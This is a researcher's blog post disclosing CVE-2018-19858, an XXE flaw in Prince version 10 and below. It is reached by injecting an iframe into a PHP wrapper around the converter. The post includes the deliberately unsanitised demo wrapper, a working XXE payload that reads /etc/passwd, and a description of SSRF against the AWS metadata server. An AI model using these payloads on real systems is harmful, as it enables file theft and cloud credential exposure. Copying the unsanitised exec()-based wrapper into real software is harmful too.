---
layout: post
title: "XSS to XXE in Prince v10 and below (CVE-2018-19858)"
author: Corben Leo
---
### Introduction:
This is a vulnerability I found while participating in a <a class="link" href="https://en.wikipedia.org/wiki/Bug_bounty_program"  target="_blank" rel="noopener noreferrer">bug-bounty program</a> earlier this year. It affects Prince, a software that converts "HTML, XHTML, or one of the many XML-based document formats" to PDF.

### Summary
Prince (versions 10 and below) is vulnerable to XML External Entities (XXE) due to the software processing XML with no protections against entities. This allows a remote attacker to gain file read, perform SSRF attacks, DOS, and more. This software is often used with a custom web wrapper that passes user-input into an HTML template which is then converted into a PDF. 

Due to this, it will ocassionally require an XSS in the wrapper – no proper sanitization of user-input before passing it into the HTML template that's being converted.

### Exploitation: 
Demo:
- `http://<server>/convert.php`

```php
<?php
$binary = "/usr/local/bin/prince";
if($_SERVER['REQUEST_METHOD'] == 'POST') {
  $content = $_POST['content'];
  $file = "/tmp/doc.html";
  $sf = fopen($file, 'w');
  fwrite($sf, $content);
  fclose($sf);
  exec($binary." /tmp/doc.html -o out.pdf");
  header('Location: /out.pdf');
} else {
	echo '
<html>
<head>
<title>Convert</title>
<style>
textarea {
  width: 500px;
  height: 300px;
}
</style>
</head>
<body>
	<textarea name="content" form="princeForm">Enter text here...</textarea>
        <form method="POST" action="/convert.php" id="princeForm">
        <input type="submit" value="Convert to PDF"></input>
        </form>
</body>
</html>
	';
}
?>
```


Host an XML file with the following contents:

```
<?xml version="1.0"?>
<!DOCTYPE cdl [<!ENTITY asd SYSTEM "file:///etc/passwd">]>
<cdl>&asd;</cdl>
```

Now give the converter the following HTML:

`<iframe src="http://<server>/xxe.xml">` 

Prince will then <b>retrieve</b> the url in the SRC attribute in an attempt to display the iframe, <b>process</b> the XML we provide, and then render the result in the converted PDF document:

![etcpasswd](/images/prince/passwd.png "Contents of Passwd")


We can exploit this XXE to get full-read SSRF by giving it a SYSTEM entity with a <b>URL</b> instead, such as the AWS metadata server:

![aws](/images/prince/ssrf.gif "AWS SSRF")

## outro:
This issue was fixed in Prince version 11 and was assigned the following CVE: <special>CVE-2018-19858</special>.
<br><br>
There's another vulnerability affecting Prince versions 12 and below that I'll write-up soon as soon as it's patched.
<br><br>
Thanks for reading,<br>
**Corben Leo**
- <a class="link" href="https://twitter.com/hacker_"  target="_blank" rel="noopener noreferrer">https://twitter.com/hacker_</a>
- <a class="link" href="https://hackerone.com/cdl" target="_blank" rel="noopener noreferrer">https://hackerone.com/cdl</a>
- <a class="link" href="https://bugcrowd.com/c" target="_blank" rel="noopener noreferrer">https://bugcrowd.com/c</a>
- <a class="link" href="https://github.com/lc"  target="_blank" rel="noopener noreferrer">https://github.com/lc</a>

 